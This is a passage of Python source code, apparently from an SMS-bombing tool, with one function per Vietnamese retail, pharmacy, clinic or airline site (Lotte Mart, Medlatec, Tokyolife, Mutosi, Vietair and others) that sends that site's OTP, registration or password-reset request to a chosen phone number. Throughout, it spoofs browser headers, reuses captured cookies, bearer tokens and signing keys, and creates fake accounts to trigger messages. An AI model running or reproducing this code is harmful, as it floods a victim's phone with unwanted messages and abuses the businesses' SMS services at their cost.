		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"x-channel": "EStore",
		"access-control-allow-origin": "*",
		"order-channel": "1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://nhathuoclongchau.com.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://nhathuoclongchau.com.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
    response = requests.post(url, data=payload, headers=headers)
def lottemart(phone):
    url = "https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp"

    payload = json.dumps({
		"username": phone,
		"case": "register"
	})
	
    payload2 = json.dumps({
		"username": phone,
		"case": "login"
	})
	
    headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://www.lottemart.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "_gcl_au=1.1.870809995.1716268436; _ga=GA1.1.112363828.1716268444; _fbp=fb.1.1716268448621.993818798; localConsent=true; __Host-next-auth.csrf-token=94ec065f987a06a8d5cf80257d75631fcfbab0eda7af4eb071537e618605760f%7C4db19ad47b743267065d4e45734feaf36139881e506e336b88cdd1ccc78e95ef; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _ga_6QLJ7DM4XW=GS1.1.1716268443.1.1.1716268641.56.0.0"
	}
		
    headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://www.lottemart.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.lottemart.vn/login?callbackUrl=https://www.lottemart.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "_gcl_au=1.1.870809995.1716268436; _ga=GA1.1.112363828.1716268444; __Host-next-auth.csrf-token=e2bb38c7f6f57ad717be7f41c5ea67caa1c08cef47bb63d1cab55a461c265bd5%7C203f8ccd628520e22b4cbf8ded308629129e19e4202b66595e607cd58e3c02af; _fbp=fb.1.1716268448621.993818798; localConsent=true; _ga_6QLJ7DM4XW=GS1.1.1716268443.1.1.1716268486.17.0.0; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn%2F"
	}
	
    response = requests.post(url, data=payload, headers=headers)
	
    if response.status_code == 400:
	    response = requests.post(url, data=payload2, headers=headers2)
def medicare(phone):
    global thanhcong
    headers={
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://medicare.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://medicare.vn/login",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
    data=json.dumps({
		"mobile": phone,
		"mobile_country_prefix": "84"
	})
    requests.post('https://medicare.vn/api/otp',headers=headers,data=data)
def hoangphuc(phone):
    payload = f"action_type=1&tel={phone}"
    headers={
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"x-newrelic-id": "UAcAUlZSARABVFlaBQYEVlUD",
		"tracestate": "1322840@nr=0-1-4173019-1120237972-2f76f2d298821976----1716265725675",
		"traceparent": "00-50648510533c824a7aba54e73786266f-2f76f2d298821976-01",
		"sec-ch-ua-mobile": "?1",
		"newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjJmNzZmMmQyOTg4MjE5NzYiLCJ0ciI6IjUwNjQ4NTEwNTMzYzgyNGE3YWJhNTRlNzM3ODYyNjZmIiwidGkiOjE3MTYyNjU3MjU2NzUsInRrIjoiMTMyMjg0MCJ9fQ==",
		"x-requested-with": "XMLHttpRequest",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://hoang-phuc.com",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://hoang-phuc.com/customer/account/create/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "PHPSESSID=8c9babb713e086251543e119b1e6ba4b; form_key=JWVmJDeh5EMyXPN6; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; form_key=JWVmJDeh5EMyXPN6; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _gcl_au=1.1.1094982322.1716265400; _pk_ses.564990520.6493=*; _fbp=fb.1.1716265400352.441126268; cdp_session=1; _ac_au_gt=1716265401815; _ga=GA1.1.658532119.1716265406; au_id=1492242163; cdp_blocked_sid_16282890=true; _asm_visitor_type=r; section_data_ids={}; mage-messages=; _pk_id.564990520.6493=1492242163.1716265400.1.1716265690.1716265400.; _ac_client_id=1492242163.1716265691; _asm_ss_view=%7B%22time%22%3A1716265406598%2C%22sid%22%3A%223753762300356011%22%2C%22utime%22%3A%222024-05-21T04%3A28%3A11%22%2C%22duration%22%3A284919%2C%22page_view_order%22%3A2%7D; _ac_an_session=zgzkzmzgzkzlzhzgzjzjzgzmzlzjzizizdziznzqzhzhznzhzizlzgzdzizkzizlzhzlzmzlzqzizdzizdzizkzizlzhzlzmzlzqzizdzizkzizlzhzlzmzlzqzizdzizdzizmzdzgzd2f27zdzgzdzlzmzkzjzlzdzd2x1vz8341v271x; _ga_48P0WR3P2C=GS1.1.1716265406.1.1.1716265691.6.0.0; private_content_version=18012186bba5dcdee8ca210c83ebbba2"
	}
    requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/',headers=headers,payload=payload)
def gumac(phone):
    data=json.dumps({
		"phone": phone
	})
    headers={
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://gumac.vn",
		"Sec-Fetch-Site": "same-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://gumac.vn/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
	}
    requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number',headers=headers,data=data)
def medlatec(phone):
	url = "https://medlatec.vn/auth/register/"
	url2 = "https://medlatec.vn/auth/validuserandsendotp/"

	payload = f"PhoneOrEmail={phone}&Password=%40vrxx1337&ConfirmPassword=%40vrxx1337"
	payload2 = f"PhoneOrEmail={phone}"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://medlatec.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://medlatec.vn/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": ".Smart.Antiforgery=CfDJ8DSG0bZeGvBGgSvDw88CXjbNYTlI6Ldkx_yoUTzCCIW-Ekh_TjXIx0GukMH4QqUXICnd8iQQuaJWkC3p86mPkBIBu6wdKIyQetHeIgtUCpGiz8rdCMd0LJ0HM9UrEPuObzlsS9zHP0qUSyIQQOkIygc; SERVERID=web43_1; _gid=GA1.2.213543563.1716264251; _gat_gtag_UA_20501699_10=1; _gcl_au=1.1.1090483214.1716264252; _ga_8KSQHM905V=GS1.1.1716264257.1.0.1716264257.60.0.0; _ga=GA1.1.2079127711.1716264251; _clck=1lugyr3%7C2%7Cfly%7C0%7C1602; _fbp=fb.1.1716264259105.813249323812401752; __zi=2000.SSZzejyD5TilXl6ptW9QsIJ7y-V0J5J1PflXxTvU5jDmYUwprrzIcd28vxxLMb7US8hbzDLKLjjtXU7rC0.1; _ga_WQB0JY55Q6=GS1.1.1716264263.1.0.1716264263.60.0.0; _clsk=1hq5m2q%7C1716264264936%7C1%7C0%7Ck.clarity.ms%2Fcollect; _ga_307151563=GS1.1.1716264268.1.0.1716264268.0.0.34254185; FCNEC=%5B%5B%22AKsRol-H6z75Ouz-UZyjWDDRPFNm6WWzebmssmjoWlL-VfD6JGhrnC79QqnL4FqVNvBREa-aVRAVE1ZijRn5VSHeu15TMNr3FGr8MgCjnvfe0u-fdFRgjxv99vKCvBcOt_uPwfT1k3lb_p8kRP9moMW4g00A_UEaeg%3D%3D%22%5D%5D"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://medlatec.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://medlatec.vn/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "_gid=GA1.2.213543563.1716264251; _gcl_au=1.1.1090483214.1716264252; _clck=1lugyr3%7C2%7Cfly%7C0%7C1602; _fbp=fb.1.1716264259105.813249323812401752; __zi=2000.SSZzejyD5TilXl6ptW9QsIJ7y-V0J5J1PflXxTvU5jDmYUwprrzIcd28vxxLMb7US8hbzDLKLjjtXU7rC0.1; .Smart.Antiforgery=CfDJ8Plro6dSv7NCk_e9BQh5x74pQYaQjz-CWhS_S05JloXJhY8tyE0gHmoB7KYhZUZSYzbYYaE4rKUXY9kzSSJw91zmXffLDXtUqP_aeP9Brq5x2kczWL8qE3hG1PdqnB6KfGRMJ3BU49PB2YlboTn3L64; SERVERID=web43_3; _ga_WQB0JY55Q6=GS1.1.1716264263.1.1.1716264526.60.0.0; _ga_307151563=GS1.1.1716264268.1.1.1716264526.0.0.1513059950; _gat_gtag_UA_20501699_10=1; _ga_8KSQHM905V=GS1.1.1716264257.1.1.1716264527.60.0.0; _ga=GA1.1.2079127711.1716264251; _clsk=qwdm4i%7C1716264533518%7C1%7C1%7Ck.clarity.ms%2Fcollect; FCNEC=%5B%5B%22AKsRol_jV8XWd_t2Vh4BeZZz_Xv-zIFAZ6SBhQFvG0Krw82AKAzx4nF0WrGCNwgELyVu8PS369PYE8e769pQXIoXTCBUPdJ6ZvNpYmCgPUAquFJeGfex9qvSRPgWMw0163TsKI1ZKPYNaEMe7Xjsg_z-PuoqrJseXA%3D%3D%22%5D%5D"
	}
		
	response = requests.post(url, data=payload, headers=headers)
	
	if "RegisterFailOn" in response.text:
		response = requests.post(url2, data=payload2, headers=headers2)
def tokyolife(phone):
	url = "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register"
	url2 = "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/forgot-password"

	payload = json.dumps({
		"phone_number": phone,
		"name": "Nguyễn Duy",
		"password": "xinx12@@",
		"email": f"vrxxdev{random.randint(1, 999)}@gmail.com",
		"birthday": "2001-01-01",
		"gender": random.choice(["male", "female"])
	})
	
	payload2 = json.dumps({
		"phone_number": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"timestamp": "1716263773508",
		"signature": "218c64573564a4e6be914b4a85e3ec55",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://tokyolife.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://tokyolife.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"timestamp": "1716264027567",
		"signature": "ed9dd00052e6b2d40efac169217d7739",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://tokyolife.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://tokyolife.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
		
	if response.status_code == 400:
		response = requests.post(url2, data=payload2, headers=headers2)
def mutosi(phone) -> dict:
	url = "https://api-omni.mutosi.com/client/auth/register"
	url2 = "https://api-omni.mutosi.com/client/auth/reset-password/send-phone"
	
	payload = json.dumps({
		"name": "Lê Quốc Việt",
		"phone": phone,
		"password": "Telegram@vrxx1337",
		"confirm_password": "Telegram@vrxx1337",
		"firstname": None,
		"lastname": None,
		"verify_otp": 0,
		"store_token": "226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
		"email": f"vrxxdev{random.randint(1, 999)}@gmail.com",
		"birthday": f"2001-0{random.randint(1, 9)}-{random.randint(10, 29)}",
		"accept_the_terms": 1,
		"receive_promotion": 1
	})
	
	payload2 = json.dumps({
		"phone": phone,
		"token": "03AFcWeA4W59pirg8OXzAOI2Bh55nLRuKgRkRc8sqRTov__qcJwUZ72iyyBgjMXhgCChrKf54tPzpvOG--I6Lefq54JdoZvQPr3wJRyrRID5UU_uogKC-qB3KPPX0i89q_RSx3F706J9RG2rNByywGoSUJQwomtSG1PlR6tFeM-Z8gvncmpDZwKDFMR7iip8IWjZRKk1o9YKOZ95LX6ep1Ieb7H85bvlOTHA3HYnhhdlOOhRniFCbnRgWq3BZeI9whO5Wzfwam0gulyWdX7arHeyRg7JP9ws5yCUHtjiLAr96CLampR04IGE9ltN35qjwifqkOlpzpEWDMXPR_ZfuQ-t00KvORV9WXPJ9MiKguMOtXlaHbgae1G7ER9wbBCPSrknvNWFPrUH0R6hj1OXEtN1-ChtYeyCroScrOOfUty0dTV6zr7Ds1EIFcvFePT4Lnz8Kzz1oR2DPMvdaSXGdhANtvVw6m6sCnqW9QuZ1q7eddWkBsGa4xKJcccwJRliWbDWZXqHV5zn-IUcft4gwXujv9b6vpl07_tfXXytWSWIsSLfHrMUcDheDbMmUxdxpoQrrGFiJUvtfBlv8ijhPFhAernAwDW1RVhRLVtZ93amYP9CdzfG9xHwdICqshWTR-_L8MxteMGv8y5zTDybH5XlNT2Ks7RFqMakuP9LYPtaPfE6EQnsb6Z8E",
		"source": "web_consumers"
	})
	
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://mutosi.com",
		"Sec-Fetch-Site": "same-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://mutosi.com/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://mutosi.com",
		"Sec-Fetch-Site": "same-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://mutosi.com/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3"
	}
	
	requests.post(url, data=payload, headers=headers)
	response = requests.post(url2, data=payload2, headers=headers2)
def pantio(phone: str, type: str = "sms") -> dict:
	url = "https://api.suplo.vn/v1/auth/customer/otp/sms/generate"
	
	params = {
		"domain": "pantiofashion.myharavan.com",
	}
		
	payload = {
		"phoneNumber": phone,
	}
	
	headers = {
		"accept": "*/*",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		"origin": "https://pantio.vn",
		"priority": "u=1, i",
		"referer": "https://pantio.vn/",
		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Windows\"",
		"sec-fetch-dest": "empty",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "cross-site",
		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	}
		
	response = requests.post(url, params=params, headers=headers, data=payload)
def thirtyshine(phone):
	url = "https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send"

	payload = json.dumps({
		"phone": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://30shine.com",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://30shine.com/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "AWSALB=1WhtetBM7tYKuuhoQUL6bhD6YgJtTGYHiy3m3yCDWjl0iQrKySuysWSsz8elIOUcYeJN5VjVkbFzyBtnxO6lTH1kCa1L9LSAIcC+/C5bDW4kK2JAnvIbZg2bqxOH; AWSALBCORS=1WhtetBM7tYKuuhoQUL6bhD6YgJtTGYHiy3m3yCDWjl0iQrKySuysWSsz8elIOUcYeJN5VjVkbFzyBtnxO6lTH1kCa1L9LSAIcC+/C5bDW4kK2JAnvIbZg2bqxOH"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def vietair(phone):
	url = "https://vietair.com.vn/Handler/CoreHandler.ashx"

	payload = f"op=PACKAGE_HTTP_POST&path_ajax_post=%2Fservice03%2Fsms%2Fget&package_name=PK_FD_SMS_OTP&object_name=INS&P_MOBILE={phone}&P_TYPE_ACTIVE_CODE=DANG_KY_NHAN_OTP"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"x-requested-with": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://vietair.com.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://vietair.com.vn/khach-hang-than-quen/dang-ky",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "_gcl_au=1.1.749309239.1716223603; _gid=GA1.3.1954334173.1716223604; set-show-banner-app=true; counter-show-banner-app=0; _tt_enable_cookie=1; _ttp=ZcF7f0Y61ZgUD6P8HIi65cWwxho; _fbp=fb.2.1716223627581.2060308024; _dc_gtm_UA-46676256-1=1; _ga=GA1.1.1362514480.1716223604; _ga_R4WM78RL0C=GS1.1.1716223604.1.1.1716223786.55.0.0"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def kingfood(phone) -> dict:
	url = "https://api.onelife.vn/v1/gateway/"
		
	payload = json.dumps({
		"operationName": "SendOTP",
		"variables": {
			"phone": phone[1:]
		},
		"query": "mutation SendOTP($phone: String!) {\nsendOtp(input: {phone: $phone, captchaSignature: \"\", email: \"\"}) {\notpTrackingId\n__typename\n}\n}"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"domain": "kingfoodmart",
		"sec-ch-ua-mobile": "?1",
		"authorization": "",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://kingfoodmart.com",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://kingfoodmart.com/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def thefaceshop(phone):
	url = "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification"

	payload = json.dumps({
		"phoneNumber": "84" + phone[1:]
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"accept-language": "vi",
		"sec-ch-ua-mobile": "?1",
		"timestamp": str(time.time() * 1000),
		"key": "966347947ebe400537e243008f9fe68b",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://thefaceshop.com.vn",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://thefaceshop.com.vn/"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def reebok(phone):
	url = "https://reebok-api.hsv-tech.io/client/phone-verification/request-verification"

	payload = json.dumps({
		"phoneNumber": "84" + phone[1:]
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"accept-language": "vi",
		"sec-ch-ua-mobile": "?1",
		"timestamp": "1716221698619",
		"key": "ae9cc22a474b3d91dbeb2acd768d29ff",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://reebok.com.vn",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://reebok.com.vn/"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def routine(phone: str, type: str = "sms") -> dict:
	url = "https://routine.vn/customer/otp/send/"
		
	data={'telephone':phone,'isForgotPassword': '0'}
		
	headers = {
  "authority": "routine.vn",
  "path": "/customer/otp/send/",
  "scheme": "https",
  "Accept": "application/json, text/javascript, */*; q=0.01",
  "Accept-Encoding": "gzip, deflate, br, zstd",
  "Accept-Language": "en-US,en;q=0.9",
  "Content-Length": "39",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "Cookie": "PHPSESSID=qb02r90f0cq15ar9943agts3p9; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; _gcl_au=1.1.701297625.1721703622; AMP_MKTG_d92ebfa0f9=JTdCJTdE; form_key=l46Vu7kYWq09Il9B; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; _fbp=fb.1.1721703622562.39501392151318669; _ga_JZNCRNC4SL=GS1.1.1721703622.1.0.1721703622.60.0.0; _ga=GA1.1.730697786.1721703623; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=l46Vu7kYWq09Il9B; _tt_enable_cookie=1; _ttp=Dh-wWRNrDehEj6yD4mjcgdI7WZS; _clck=iszdge%7C2%7Cfnp%7C0%7C1665; _ym_uid=1721703624404415555; _ym_d=1721703624; _ym_isad=2; cto_bundle=Wzcc019xa3U5JTJCVEZlUFhIUWVyd2ZSWGclMkJPR0hwRmNwdVBzMTcwUHZOY0hGUEFlNlJTSGd6WDF0YUQlMkZ0QjU5NnpWNk9IUmYzMUlWWGQ4c1hqQnBaRFd1NTdkMUVDV1FmUHNLTkpidlFtJTJGdmNUZG1PYjZjR00yMG9lNkZDS1lZQiUyRjlPMGhrUHpnSU5pU2UlMkIwNDklMkZBaHpETmJmdyUzRCUzRA; private_content_version=f2c00545079a5638603d7e7910a875b0; section_data_ids=%7B%22customer%22%3A1721703621%7D; _clsk=zkky8q%7C1721705857819%7C1%7C1%7Cf.clarity.ms%2Fcollect; AMP_d92ebfa0f9=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJlOTA2YWMwMC04MGYxLTRlY2QtYTc4NC02ZjJiZWNlOGZjNGUlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzIxNzA2MTQ0ODQzJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMTcwNjE0NDg4MCUyQyUyMmxhc3RFdmVudElkJTIyJTNBOCU3RA==",
  "Origin": "https://routine.vn",
  "Priority": "u=1, i",
  "Referer": "https://routine.vn/customer/account/create/",
